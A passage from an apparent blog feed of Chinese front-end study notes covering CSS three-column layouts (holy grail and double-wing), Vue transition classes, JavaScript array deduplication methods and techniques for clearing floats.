cogs"><p>分析：<br>1.首先container只是一个三栏布局整体的包裹，不是布局重点。main占据整行，main的子元素main-wrap才是中间的内容区域。main-wrap设置 左、右margin的目的是为left、right两栏留空。<br>2.三栏都 float: left；<br>3.中间栏width:100%；左栏margin-left: -100%； 右栏 （负 自身宽度） margin-left: -190px<br>（解释：由于main宽100%，此时left、right两栏都被挤到第二行。设置各自的 “负margin-left值”使它们分别移动到 第一行的左右两边）</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">min-width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.col</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#main</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* height: 200px; */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#main-wrap</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: lightblue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">190px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*这是圣杯和双飞翼最明显的区别，在main内部使用的是margin，而圣杯是直接在container部分使用padding*/</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">190px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#0000FF</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: -<span class="number">190px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#FF0000</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main-wrap&quot;</span>&gt;</span> #main</span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span> /&gt;</span>ipsum dolor sit amet consectetur adipisicing elit. Rerum consequatur</span><br><span class="line">                amet assumenda quasi, nulla unde laboriosam non id eum natus magni praesentium quibusdam ducimus sed!</span><br><span class="line">                Fuga iusto veniam ipsam voluptatum?</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>#left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span>#right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/zuo-zhong-you-san-lan-shi-bu-ju/%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80.gif" alt="双飞翼布局"></p><p> ### 方法6：圣杯布局（也是重点）优先显示 main主要部分 !</p><div class="tip cogs"><p>分析：<br>1.最外层wrapper设置padding-left、padding-right。目的是为left、right两栏留空。<br>2.三栏都 float: left；<br>3.main的width: 100%、 left栏margin-left: -100%、right栏margin-left: -100px（负 自身宽度）<br>（解释：由于main宽100%，此时left、right两栏都被挤到第二行。设置各自的 “负margin-left值”使它们分别移动到 第一行的左右两边）<br>4.left栏left: -100px;、right栏right: -100px;  两栏都 相对自身定位position: relative;<br>（解释：left、right两栏都 相对于自身， 分别 向左右两边 移动自身的宽度）</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.col</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.main</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: yellow;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: -<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: -<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: -<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col main&quot;</span>&gt;</span>main<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/zuo-zhong-you-san-lan-shi-bu-ju/%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80.gif" alt="圣杯布局"></p><p><a href="https://blog.csdn.net/a18792627168/article/details/79686746?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-79686746-blog-80587167.235%5Ev28%5Epc_relevant_t0_download&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-79686746-blog-80587167.235%5Ev28%5Epc_relevant_t0_download&utm_relevant_index=3">详见：css三列布局–两边固定中间自适应和中间固定两边自适应_中间固定两边自适应布局_DOM曼珠沙华的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue中transition之enter,leave等</title>
      <link href="/posts/vue-zhong-transition-zhi-enter-leave-deng/"/>
      <url>/posts/vue-zhong-transition-zhi-enter-leave-deng/</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="transition分为以下-六个阶段："><a href="#transition分为以下-六个阶段：" class="headerlink" title="transition分为以下 六个阶段："></a><strong>transition分为以下 六个阶段：</strong></h2><ul><li>enter, enter-active, enter-active-to,  </li><li>(开始 进入阶段的)第1帧 <strong>属性值</strong>，<em>到</em> (<strong>默认属性值</strong> 的<em>过渡阶段</em>)，移除enter动画，  </li><li>leave, leave-active, leave-active-to  </li><li>(开始 离开 阶段的)第1帧 <strong>默认属性值</strong>，<em>到</em> (<strong>属性值</strong> 的<em>过渡阶段</em>)，移除leave动画<br><img src="/posts/vue-zhong-transition-zhi-enter-leave-deng/vue-transition%E9%98%B6%E6%AE%B5.webp" alt="vue-transition阶段"></li></ul></blockquote><h2 id="2种使用："><a href="#2种使用：" class="headerlink" title="2种使用："></a>2种使用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;slide&quot;&gt;&lt;/transition&gt;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* 正常状态下detail组件默认为transformX(0) */</span></span><br><span class="line"><span class="selector-class">.slide-enter</span>,</span><br><span class="line"><span class="selector-class">.slide-leave-to</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span> : <span class="built_in">translateX</span>(<span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.slide-enter-active</span>,</span><br><span class="line"><span class="selector-class">.slide-leave-active</span> &#123; <span class="attribute">transition</span>: all .<span class="number">6s</span>;&#125;</span><br></pre></td></tr></table></figure><p>不考虑过渡速率，与下同，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> slideMove&#123;</span><br><span class="line">    <span class="number">0%</span>&#123; <span class="attribute">transform</span> : <span class="built_in">translateX</span>(<span class="number">100%</span>); &#125;</span><br><span class="line">    <span class="number">100%</span>&#123; <span class="attribute">transform</span> : <span class="built_in">translateX</span>(<span class="number">0</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.slide-enter-active</span> &#123; <span class="attribute">animation</span>: .<span class="number">6s</span> slideMove;&#125;</span><br><span class="line"><span class="selector-class">.slide-leave-active</span> &#123; <span class="attribute">animation</span>: .<span class="number">6s</span> slideMove reverse;&#125; <span class="comment">/* 动画顺序翻转 */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组去重的5种方法</title>
      <link href="/posts/shu-zu-qu-chong-de-5-chong-fang-fa/"/>
      <url>/posts/shu-zu-qu-chong-de-5-chong-fang-fa/</url>
      
        <content type="html"><![CDATA[<blockquote><p>var arr &#x3D; [1, 2, 2, 3, 4, 4, 5, 6, 7, 7, 4, 3, 5, 7, 11, 12, 11];<br>var newArr &#x3D; [];</p></blockquote><p>&#x2F;&#x2F;<strong>方法1最优 set对象</strong>【Set是没有重复值的数据集合，传入一个需要去重的数组，Set会自动删   &#x2F;&#x2F; newArr &#x3D; Array.from(new Set(arr));<br>&#x2F;&#x2F; console.log(newArr)<br><strong>&#x2F;&#x2F;方法2时间短，占空间。newArr.indexOf</strong>【遍历原数组的各项，每次判断新数组中是否存在该项，不存在就把当前项添加到新数组中。此法效率高，但占空间】<br>&#x2F;* arr.forEach(function (item, index) {<br>  if (newArr.indexOf(item) &#x3D;&#x3D;&#x3D; -1) {<br>     newArr.push(item)<br>  }<br>}); * <strong>&#x2F;</strong></p><p>&#x2F;* arr.forEach((item, index) &#x3D;&gt; {&#x2F;&#x2F; 方法2 箭头函数写法<br>  if (newArr.indexOf(item) &#x3D;&#x3D;&#x3D; -1) {<br>     newArr.push(item)<br>  }<br>}); *&#x2F;<br>const m &#x3D; new Map();</p><p>&#x2F;&#x2F;【下面的方法用时依次增多！！】<br>&#x2F;&#x2F; <strong>方法3.1  map()</strong> 【初始化一个可由 键值对 组成的集合m，形如二维数组。利用Map中 key的唯一性 同名覆盖。再遍历Map集合中的唯一key，并依次放入新数组newArr】</p><p>&#x2F;*  for (let i &#x3D; 0; i &lt; arr.length; i++) {<br>  &#x2F;&#x2F;  m.set(key, value);第一个值为key，注意与forEach((value, key, array)&#x3D;&gt;{ })参数顺序做区分。<br>  m.set(arr[i], true);&#x2F;&#x2F;依次把arr中每一项，设定为m中的唯一key<br>}<br>m.forEach(function (item, index) {<br>  newArr.push(index)&#x2F;&#x2F;注意：m集合中的key，此时是forEach中的index！之后把 唯一值 放入 新数组<br>});  *&#x2F;</p><p>&#x2F;&#x2F; <em><strong>方法3.2，map() 是3.1的进阶，也是利用Map中 key的唯一性</strong></em><br>&#x2F;&#x2F; 若m集合中不存在以当前arr项命名的key，就把当前项设置为m集合中的新key，同时把当前项放入新数组。<br>&#x2F;* for (let i &#x3D; 0; i &lt; arr.length; i++) {<br>  if (!m.has(arr[i])) {<br>    m.set(arr[i])<br>    newArr.push(arr[i])<br>  }<br>}; *&#x2F;</p><p>&#x2F;&#x2F;<strong>方法4 filter+arr.indexOf</strong>【遍历arr原数组中的每一项item和index，分别获取的每个item在arr中首项（唯一）的索引组成的集合 是arr原数组所有索引构成集合的一个 子集。返回在两种index一致时，即该索引子集 对应项 所组成的数组，拷贝给newArr】<br>&#x2F;* newArr &#x3D; arr.filter(function (item, index) {<br>  return arr.indexOf(item) &#x3D;&#x3D; index;<br>});*&#x2F;</p><p>&#x2F;&#x2F;<strong>方法5 reduce</strong>【以作为initialValue的[]开始聚合，每次循环聚合返回的结果集_newArr也是数组。遍历原数组arr，拿arr的item依次进行判断：若 最新的 结果集 中，不存在arr的当前item，即把该项添加到结果集数组中。返回新结果集，继续下一个item判断】<br>&#x2F;* newArr &#x3D; arr.reduce((_newArr, item) &#x3D;&gt; {<br>!_newArr.includes(item) &amp;&amp; _newArr.push(item);<br> &#x2F;&#x2F; if (!_newArr.includes(item)) {<br>    _newArr.push(item);<br> &#x2F;&#x2F; }<br>  return _newArr;<br>}, []); *&#x2F;<br>&#x2F;&#x2F; console.log(newArr);</p><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需求3， 得到各数字每次出现的次数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;各出现次数结果&quot;</span>, arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//pre结果集（对象）中有以 当前项cur 作为key命名的。便把该key对应的value值pre[cur] 赋值给val。没有则初始化为0.</span></span><br><span class="line"><span class="keyword">let</span> val = pre[cur] || <span class="number">0</span>;</span><br><span class="line">pre[cur] = ++val;<span class="comment">//存在以 当前项cur 作为key命名的。便把该key对应的value值pre[cur]，+1</span></span><br><span class="line"><span class="keyword">return</span> pre;<span class="comment">//每次循环， pre对象 结果集 可能不变/增加键值对/原有键值对的value,即pre[cur]+1</span></span><br><span class="line">&#125;, &#123;&#125;)) */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清除浮动探讨</title>
      <link href="/posts/qing-chu-fu-dong-tan-tao/"/>
      <url>/posts/qing-chu-fu-dong-tan-tao/</url>
      
        <content type="html"><![CDATA[<p>转载地址：<br><a href="https://www.cnblogs.com/qin-tian/p/5910288.html">https://www.cnblogs.com/qin-tian/p/5910288.html</a><br><a href="https://my.oschina.net/leipeng/blog/221125"><br>https://my.oschina.net/leipeng/blog/221125</a><br><a href="https://www.cnblogs.com/leejersey/p/3991398.html"><br>https://www.cnblogs.com/leejersey/p/3991398.html</a></p><p>说起清除浮动，大家肯定会想起 clear: both ，的确，这是 CSS 中清除浮动的属性，clear 有 both&#x2F;left&#x2F;right&#x2F;none&#x2F;inherit 几个属性值，分别代表在元素左右两侧不允许出现浮动元素&#x2F;左侧不允许出现浮动元素&#x2F;右侧不允许出现浮动元素&#x2F;不清除浮动&#x2F;继承父元素的值。<br>注意：clear属性只是在block元素是起作用，如果你把clear:both用在一个inline-block或inline元素上，clear:both是不会起任何作用的。】</p><p><strong>浮动的兄弟元素 如何避免 对其兄弟元素造成影响？？？</strong><br>直接为 浮动元素的 兄弟元素 设置 clear: both ；</p><blockquote><p><img src="/posts/qing-chu-fu-dong-tan-tao/1.webp" alt="清除浮动对于兄弟元素的影响"><br>设置了 clear: both （当然在该例子中也可以为 clear:left）的元素不会跟浮动元素同行，也不会根据内容来自动调整宽度，而是会占据新的一整行。<br>之所以会这样，要从 clear的原理说起，clear 会为元素添加足够的空白空间，这跟增加元素外边距使到元素占据满行而强制换行的效果是一样的。<br>这只是清除了<strong>浮动 对于兄弟元素的影响</strong> ，而 <strong>父元素 高度塌陷</strong> 的问题还没有解决，因此，我们需要更高级的清除浮动的方法。</p></blockquote><p><strong>如何解决 浮动元素的 父元素 高度塌陷 问题？？？</strong><br>在标准文档流下，父元素高度可以被子元素撑开。<br>当父元素不设置浮动， 未给父元素设定 固定高度 时。当子元素设置了浮动，脱离了标准的文档流，那么父元素的高度会变成 0。<br>如果不清除浮动造成的影响，父元素高度不够，若设置border或者background属性都将得不到正确的解析。<br><em><strong>解决办法</strong></em></p><div class="tip cogs"><p>1、给浮动元素的  “父级” 指定 固定height<br>2、激活浮动元素 “上一级”的BFC。给浮动元素的 “上一级” 加overflow:auto; 或overflow:hidden;<br>3、使用：after伪元素，相当于给浮动元素，添加 “带有clear:both的兄弟元素”。【以上两种方式都存在局限性，此法为 最优解】</p></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">   <span class="attribute">content</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">   dispaly:block;</span><br><span class="line">   <span class="attribute">clear</span>:both;</span><br><span class="line">   <span class="attribute">height</span>:<span class="number">0</span>;<span class="comment">/* 此处使用line-height:0;也可 */</span></span><br><span class="line">   <span class="attribute">visibility</span>:hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">   <span class="attribute">zoom</span>:<span class="number">1</span>;<span class="comment">/* 兼容IE6 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或是：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>,<span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">   <span class="attribute">content</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="attribute">display</span>:table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">   <span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="总结：-清除浮动影响的方法-可分成2类："><a href="#总结：-清除浮动影响的方法-可分成2类：" class="headerlink" title="总结： 清除浮动影响的方法 可分成2类："></a>总结： 清除浮动影响的方法 可分成2类：</h2><p>1.利用 clear 属性，包括在浮动元素末尾添加一个带有 clear: both 属性的空 div 来闭合元素，其实利用 :after伪元素的方法也是在元素末尾添加一个内容为一个点并带有 clear: both 属性的元素实现的。<br>2.触发 <em>浮动元素</em> <strong>父元素</strong>的 BFC (Block Formatting Contexts, 块级格式化上下文)，使到该父元素可以包含浮动元素。</p></blockquote><p>一、抛一块问题砖（display： block）先看现象：<br><img src="/posts/qing-chu-fu-dong-tan-tao/2.webp" alt="pic1"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">.outer&#123;border: 1px solid #ccc;background: #fc9;color: #fff; margin: 50px auto;padding: 50px;&#125;</span><br><span class="line">.div1&#123;width: 80px;height: 80px;background: red;float: left;&#125;</span><br><span class="line">.div2&#123;width: 80px;height: 80px;background: blue;float: left;&#125;</span><br><span class="line">.div3&#123;width: 80px;height: 80px;background: sienna;float: 